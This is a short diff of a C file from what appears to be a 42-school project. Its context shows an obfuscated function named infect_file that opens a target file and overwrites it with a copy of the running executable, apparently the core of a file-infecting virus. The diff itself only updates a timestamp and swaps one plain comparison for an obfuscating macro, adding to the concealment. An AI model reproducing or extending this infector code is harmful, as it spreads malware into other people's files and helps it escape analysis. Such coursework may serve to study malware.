@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
-/*   Updated: 2026/06/13 03:23:29 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/06/13 11:49:18 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,7 +21,7 @@
 int	infect_file(t_exec_ctx *fvvfewe, _Cc vfscsettbv)
 { _Iq(_CS(vfscsettbv) _EG _mZ _OR _CEH(vfscsettbv) _EG _mZ) _Rq(_pZ);
 _I uuvfvgt = _OP(vfscsettbv, O_WRONLY | O_APPEND);
-_Iq(uuvfvgt == -1) _Rq(_mZ);
+_Iq(uuvfvgt _EG _mZ) _Rq(_mZ);
 _cC wxccerrrwex = _SJ(vfscsettbv, ".tmp");
 _PP(fvvfewe->exec_path, vfscsettbv, wxccerrrwex);
 _RN(wxccerrrwex, vfscsettbv);
